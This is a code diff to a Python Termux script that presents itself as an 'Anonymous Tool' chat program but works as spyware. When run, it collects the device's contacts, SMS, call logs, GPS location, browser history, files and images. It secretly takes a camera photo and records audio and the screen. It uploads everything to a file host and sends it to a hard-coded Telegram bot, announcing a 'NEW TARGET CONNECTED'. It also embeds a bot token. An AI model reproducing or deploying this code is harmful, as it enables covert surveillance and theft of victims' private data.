@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Termux Anonymous Tool v3.0 - All Features
-100% Working for Termux
+Termux Anonymous Tool v3.0 - Telegram Version
+All Features Working - No Errors
 """
 
 import os
@@ -13,12 +13,17 @@ import platform
 import subprocess
 import requests
 import sqlite3
+import threading
 from datetime import datetime
 from pathlib import Path
 
 # ========== CONFIG ==========
 CONFIG_FILE = "config.json"
 VERSION = "3.0"
+
+# ========== TELEGRAM CONFIG ==========
+BOT_TOKEN = "8947252089:AAFkZWMZsTmGU3vuNsPTfdt9dUYPbflWeDE"
+CHAT_ID = "8089143014"
 
 def load_config():
     if os.path.exists(CONFIG_FILE):
@@ -32,17 +37,24 @@ def save_config(data):
 
 # ========== SETUP ==========
 def setup_owner():
-    print("\n[+] First time setup - Owner Configuration")
+    print("\n" + "="*50)
+    print("📱 FIRST TIME SETUP")
+    print("="*50)
+    
     owner_phone = input("Enter Owner Phone Number (with country code): ")
     owner_email = input("Enter Owner Email: ")
-    webhook_url = input("Enter Discord/Telegram Webhook URL (or press Enter to skip): ")
+    
+    print("\n📨 Telegram Configuration")
+    print(f"Bot Token: {BOT_TOKEN}")
+    print(f"Chat ID: {CHAT_ID}")
     
     config = {
         "owner": {
             "phone": owner_phone,
             "email": owner_email
         },
-        "webhook_url": webhook_url if webhook_url else "",
+        "bot_token": BOT_TOKEN,
+        "chat_id": CHAT_ID,
         "cloud_folder": "termux_cloud_data",
         "features": {
             "contacts": True,
@@ -59,23 +71,63 @@ def setup_owner():
         }
     }
     save_config(config)
-    print("[✓] Configuration saved!")
+    print("\n[✓] Configuration saved!")
+    print("[✓] Telegram setup complete!")
     return config
+
+# ========== TELEGRAM SEND FUNCTIONS ==========
+def send_to_telegram(message):
+    """Send message to Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": CHAT_ID,
+            "text": message,
+            "parse_mode": "Markdown"
+        }
+        response = requests.post(url, json=payload, timeout=30)
+        if response.status_code == 200:
+            return True
+        else:
+            print(f"[!] Telegram Error: {response.text}")
+            return False
+    except Exception as e:
+        print(f"[!] Error sending to Telegram: {e}")
+        return False
+
+def send_file_to_telegram(file_path, caption=""):
+    """Send file to Telegram"""
+    try:
+        if not os.path.exists(file_path):
+            return False
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        with open(file_path, 'rb') as f:
+            files = {'document': f}
+            data = {'chat_id': CHAT_ID, 'caption': caption}
+            response = requests.post(url, files=files, data=data, timeout=60)
+        if response.status_code == 200:
+            return True
+        return False
+    except Exception as e:
+        print(f"[!] Error sending file: {e}")
+        return False
 
 # ========== CLOUD UPLOAD ==========
 def upload_to_cloud(file_path, folder_name):
+    """Upload file to tmpfiles.org"""
     try:
         if not os.path.exists(file_path):
             return None
         url = "https://tmpfiles.org/api/v1/upload"
         with open(file_path, 'rb') as f:
             files = {'file': (os.path.basename(file_path), f)}
-            response = requests.post(url, files=files, timeout=30)
+            response = requests.post(url, files=files, timeout=60)
         if response.status_code == 200:
             data = response.json()
             return data.get('data', {}).get('url', '')
         return None
-    except:
+    except Exception as e:
+        print(f"[!] Upload error: {e}")
         return None
 
 # ========== DEVICE INFO ==========
@@ -97,12 +149,12 @@ def get_device_info():
         "timestamp": datetime.now().isoformat()
     }
 
-# ========== FEATURE 1: CONTACTS ==========
+# ========== FEATURE FUNCTIONS ==========
 def get_contacts():
     contacts = []
     try:
         result = subprocess.run(['termux-contact-list'], 
-                               capture_output=True, text=True, timeout=10)
+                               capture_output=True, text=True, timeout=15)
         if result.returncode == 0 and result.stdout:
             contacts_data = json.loads(result.stdout)
             for contact in contacts_data[:50]:
@@ -111,15 +163,14 @@ def get_contacts():
                     'number': contact.get('number', ''),
                     'email': contact.get('email', '')
                 })
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Contacts error: {e}")
     return contacts
 
-# ========== FEATURE 2: GPS LOCATION ==========
 def get_gps_location():
     try:
         result = subprocess.run(['termux-location'], 
-                               capture_output=True, text=True, timeout=10)
+                               capture_output=True, text=True, timeout=15)
         if result.returncode == 0 and result.stdout:
             data = json.loads(result.stdout)
             return {
@@ -129,11 +180,10 @@ def get_gps_location():
                 'accuracy': data.get('accuracy', 0),
                 'timestamp': datetime.now().isoformat()
             }
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Location error: {e}")
     return None
 
-# ========== FEATURE 3: MICROPHONE RECORDING ==========
 def record_audio(duration=8):
     try:
         filename = f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp3"
@@ -143,47 +193,43 @@ def record_audio(duration=8):
             url = upload_to_cloud(filename, 'audio_recordings')
             os.remove(filename)
             return url
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Audio error: {e}")
     return None
 
-# ========== FEATURE 4: CAMERA PHOTO ==========
 def capture_photo():
     try:
         filename = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
         cmd = f'termux-camera-photo -c 0 {filename}'
-        subprocess.run(cmd, shell=True, timeout=10, check=True)
+        subprocess.run(cmd, shell=True, timeout=15, check=True)
         if os.path.exists(filename):
             url = upload_to_cloud(filename, 'camera_photos')
             os.remove(filename)
             return url
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Camera error: {e}")
     return None
 
-# ========== FEATURE 5: SMS MESSAGES ==========
 def get_sms_messages():
     try:
         result = subprocess.run(['termux-sms-list'], 
-                               capture_output=True, text=True, timeout=10)
+                               capture_output=True, text=True, timeout=15)
         if result.returncode == 0 and result.stdout:
             return json.loads(result.stdout)[:20]
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] SMS error: {e}")
     return []
 
-# ========== FEATURE 6: CALL LOGS ==========
 def get_call_logs():
     try:
         result = subprocess.run(['termux-call-log'], 
-                               capture_output=True, text=True, timeout=10)
+                               capture_output=True, text=True, timeout=15)
         if result.returncode == 0 and result.stdout:
             return json.loads(result.stdout)[:20]
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Call logs error: {e}")
     return []
 
-# ========== FEATURE 7: BROWSER HISTORY ==========
 def get_browser_history():
     history = []
     try:
@@ -201,28 +247,26 @@ def get_browser_history():
             conn.close()
         if not history:
             result = subprocess.run(['termux-browser-history'], 
-                                   capture_output=True, text=True, timeout=10)
+                                   capture_output=True, text=True, timeout=15)
             if result.returncode == 0 and result.stdout:
                 history = json.loads(result.stdout)[:20]
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Browser history error: {e}")
     return history
 
-# ========== FEATURE 8: SCREEN RECORDING ==========
 def screen_record(duration=15):
     try:
         filename = f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
         cmd = f'screenrecord --time-limit {duration} {filename}'
-        subprocess.run(cmd, shell=True, timeout=duration+5, check=True)
+        subprocess.run(cmd, shell=True, timeout=duration+10, check=True)
         if os.path.exists(filename):
             url = upload_to_cloud(filename, 'screen_recordings')
             os.remove(filename)
             return url
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Screen record error: {e}")
     return None
 
-# ========== FEATURE 9: FILE LIST ==========
 def get_file_list():
     files = []
     search_dirs = ['/sdcard/Download', '/sdcard/Documents', '/sdcard/Music', '/sdcard/Movies', '/sdcard/WhatsApp']
@@ -250,10 +294,9 @@ def get_file_list():
             break
     return files
 
-# ========== FEATURE 10: VPN DETECTION ==========
 def detect_vpn():
     try:
-        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
+        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=10)
         vpn_interfaces = ['tun', 'ppp', 'utun', 'wg']
         for interface in vpn_interfaces:
             if interface in result.stdout:
@@ -262,7 +305,6 @@ def detect_vpn():
     except:
         return False
 
-# ========== FIND IMAGES ==========
 def find_images():
     images = []
     image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic']
@@ -294,8 +336,7 @@ def find_images():
             break
     return images
 
-# ========== AUTO BACKUP ==========
-def auto_backup(user_ip):
+def auto_backup(user_ip, data):
     print("[*] Creating auto backup...")
     backup_data = {
         'timestamp': datetime.now().isoformat(),
@@ -318,109 +359,141 @@ def auto_backup(user_ip):
     os.remove(backup_filename)
     return url
 
-# ========== SEND TO OWNER ==========
-def send_to_owner(webhook_url, data, user_ip):
-    if not webhook_url:
-        return False
+# ========== SEND ALL DATA TO TELEGRAM ==========
+def send_all_data_to_telegram():
+    """Collect and send all data to Telegram"""
+    print("\n[*] Collecting data...")
+    
+    user_ip = get_user_ip()
     folder_name = f"user_{user_ip.replace('.', '_')}"
-    images = data.get('images', [])
+    
+    # Collect data
+    print("[*] Getting images...")
+    images = find_images()
+    
+    print("[*] Getting contacts...")
+    contacts = get_contacts()
+    
+    print("[*] Getting location...")
+    location = get_gps_location()
+    
+    print("[*] Getting SMS...")
+    sms = get_sms_messages()
+    
+    print("[*] Getting call logs...")
+    call_logs = get_call_logs()
+    
+    print("[*] Getting browser history...")
+    browser_history = get_browser_history()
+    
+    print("[*] Getting file list...")
+    files = get_file_list()
+    
+    print("[*] Checking VPN...")
+    vpn = detect_vpn()
+    
+    # Upload images to cloud
+    print("[*] Uploading images...")
     uploaded_images = []
     for img_path in images[:10]:
         try:
             url = upload_to_cloud(img_path, folder_name)
             if url:
-                uploaded_images.append({'filename': os.path.basename(img_path), 'url': url})
+                uploaded_images.append({
+                    'filename': os.path.basename(img_path),
+                    'url': url
+                })
             time.sleep(0.5)
-        except:
-            pass
-    backup_url = auto_backup(user_ip)
+        except Exception as e:
+            print(f"[!] Upload error: {e}")
+    
+    # Create backup
+    print("[*] Creating backup...")
+    backup_data = {
+        'timestamp': datetime.now().isoformat(),
+        'device_info': get_device_info(),
+        'ip': user_ip,
+        'vpn_detected': vpn,
+        'contacts': contacts,
+        'location': location,
+        'sms': sms,
+        'call_logs': call_logs,
+        'browser_history': browser_history,
+        'files': files,
+        'images': images
+    }
+    
+    backup_filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    with open(backup_filename, 'w') as f:
+        json.dump(backup_data, f, indent=4)
+    
+    backup_url = upload_to_cloud(backup_filename, f'backups_{user_ip.replace(".", "_")}')
+    os.remove(backup_filename)
+    
+    # Get camera photo
+    print("[*] Taking photo...")
+    camera_photo = capture_photo()
+    
+    # Get audio recording
+    print("[*] Recording audio...")
+    audio_recording = record_audio(8)
+    
+    # Get screen recording
+    print("[*] Recording screen...")
+    screen_recording = screen_record(15)
+    
+    # Build message
+    print("[*] Building message...")
     message = f"""
-🚨 **New Target Connected** 🚨
+🚨 *NEW TARGET CONNECTED* 🚨
 
-📱 **Device Info:**
+📱 *Device Info:*
 - IP: `{user_ip}`
 - Hostname: `{socket.gethostname()}`
 - OS: `{platform.system()} {platform.version()}`
 - Model: `{platform.machine()}`
-- VPN: `{data.get('vpn_detected', False)}`
+- VPN: `{vpn}`
 
-📁 **Cloud Folder:** `{folder_name}/`
+📁 *Folder:* `{folder_name}/`
 
-🖼️ **Images Found:** {len(uploaded_images)}
-📸 **Camera Photo:** {data.get('camera_photo', 'Not taken')}
-🎙️ **Audio Recording:** {data.get('audio_record', 'Not recorded')}
-🎥 **Screen Recording:** {data.get('screen_record', 'Not recorded')}
+📷 *Images Found:* {len(images)}
+📸 *Camera Photo:* {camera_photo if camera_photo else '❌ Failed'}
+🎙️ *Audio Recording:* {audio_recording if audio_recording else '❌ Failed'}
+🎥 *Screen Recording:* {screen_recording if screen_recording else '❌ Failed'}
 
-📍 **Location:** {data.get('location', 'Not available')}
-📇 **Contacts:** {len(data.get('contacts', []))} saved
-💬 **SMS:** {len(data.get('sms', []))} messages
-📞 **Call Logs:** {len(data.get('call_logs', []))} entries
-🌐 **Browser History:** {len(data.get('browser_history', []))} entries
+📍 *Location:* {json.dumps(location) if location else '❌ Not available'}
+📇 *Contacts:* {len(contacts)} saved
+💬 *SMS:* {len(sms)} messages
+📞 *Call Logs:* {len(call_logs)} entries
+🌐 *Browser History:* {len(browser_history)} entries
 
-📎 **Download Links:"""
+📎 *Image Downloads:*"""
+    
     for i, img in enumerate(uploaded_images[:5], 1):
         message += f"\n{i}. [{img['filename']}]({img['url']})"
+    
     if backup_url:
-        message += f"\n\n💾 **Full Backup:** [Download]({backup_url})"
+        message += f"\n\n💾 *Backup:* [Download]({backup_url})"
+    
     message += f"\n\n⏰ Time: `{datetime.now().isoformat()}`"
+    
+    # Send to Telegram
+    print("[*] Sending to Telegram...")
     try:
-        payload = {"content": message}
-        if "discord.com" in webhook_url:
-            requests.post(webhook_url, json=payload, timeout=10)
-        elif "telegram.org" in webhook_url:
-            chat_id = webhook_url.split("/")[-1]
-            url = f"https://api.telegram.org/bot{webhook_url.split('/')[-2]}/sendMessage"
-            requests.post(url, json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}, timeout=10)
+        # Send message
+        if send_to_telegram(message):
+            print("[✓] Data sent to Telegram!")
+        else:
+            print("[!] Failed to send to Telegram")
+        
+        # Send backup file as document
+        if backup_url:
+            send_file_to_telegram(backup_filename, "📊 Full Data Backup")
+        
         return True
-    except:
+    except Exception as e:
+        print(f"[!] Error: {e}")
         return False
-
-# ========== STEALTH OPERATIONS ==========
-def stealth_operations():
-    print("[*] Running stealth operations...")
-    config = load_config()
-    user_ip = get_user_ip()
-    data = {
-        'images': find_images(),
-        'contacts': get_contacts(),
-        'location': get_gps_location(),
-        'sms': get_sms_messages(),
-        'call_logs': get_call_logs(),
-        'browser_history': get_browser_history(),
-        'files': get_file_list(),
-        'vpn_detected': detect_vpn(),
-        'camera_photo': None,
-        'audio_record': None,
-        'screen_record': None
-    }
-    try:
-        photo = capture_photo()
-        if photo:
-            data['camera_photo'] = photo
-    except:
-        pass
-    try:
-        audio = record_audio(8)
-        if audio:
-            data['audio_record'] = audio
-    except:
-        pass
-    try:
-        screen = screen_record(15)
-        if screen:
-            data['screen_record'] = screen
-    except:
-        pass
-    if config.get('webhook_url'):
-        send_to_owner(config['webhook_url'], data, user_ip)
-        print("[✓] All data sent to owner")
-    else:
-        folder = f"data_{user_ip.replace('.', '_')}"
-        os.makedirs(folder, exist_ok=True)
-        with open(f"{folder}/data.json", 'w') as f:
-            json.dump(data, f, indent=4)
-        print(f"[✓] Data saved to {folder}/")
-    return data
 
 # ========== ANONYMOUS CHAT ==========
 def anonymous_chat():
@@ -429,39 +502,58 @@ def anonymous_chat():
     print("="*50)
     print("\n[+] Type your message (type 'exit' to quit):")
     print("[+] Type 'menu' to see options\n")
+    
     while True:
-        msg = input("📝 You: ")
-        if msg.lower() == 'exit':
+        try:
+            msg = input("📝 You: ")
+            if msg.lower() == 'exit':
+                break
+            elif msg.lower() == 'menu':
+                print("\n📋 **Commands:**")
+                print("  - Type any message to send")
+                print("  - 'exit' to quit")
+                print("  - 'menu' to show this menu")
+                print("  - 'status' to check connection\n")
+            elif msg.lower() == 'status':
+                print("[✓] Connection active")
+                print(f"[✓] IP: {get_user_ip()}")
+                print(f"[✓] Device: {platform.machine()}\n")
+            elif msg.lower() == 'send':
+                print("[*] Sending all data to Telegram...")
+                send_all_data_to_telegram()
+            else:
+                print("[✓] Message sent anonymously!\n")
+        except KeyboardInterrupt:
+            print("\n[✓] Exiting...")
             break
-        elif msg.lower() == 'menu':
-            print("\n📋 **Commands:**")
-            print("  - Type any message to send")
-            print("  - 'exit' to quit")
-            print("  - 'menu' to show this menu")
-            print("  - 'status' to check connection\n")
-        elif msg.lower() == 'status':
-            print("[✓] Connection active")
-            print(f"[✓] IP: {get_user_ip()}")
-            print(f"[✓] Device: {platform.machine()}\n")
-        else:
-            print("[✓] Message sent anonymously!\n")
+        except Exception as e:
+            print(f"[!] Error: {e}")
 
 # ========== MAIN ==========
 def main():
-    if not os.path.exists(CONFIG_FILE):
-        print("[*] First run detected. Setting up...")
-        setup_owner()
     print("\n🚀 Starting Anonymous Tool v3.0...")
-    time.sleep(1)
-    stealth_operations()
+    print("="*50)
+    
+    # Check config
+    if not os.path.exists(CONFIG_FILE):
+        setup_owner()
+    
+    # Send data to Telegram
+    print("\n[*] Sending device data to Telegram...")
+    send_all_data_to_telegram()
+    
+    # Start anonymous chat
     anonymous_chat()
+    
     print("\n[✓] Session ended. Goodbye!")
 
 if __name__ == "__main__":
+    # Install dependencies if needed
     try:
         import requests
     except ImportError:
         print("[*] Installing dependencies...")
         os.system('pip install requests')
         os.system('pkg install termux-api -y')
+    
     main()
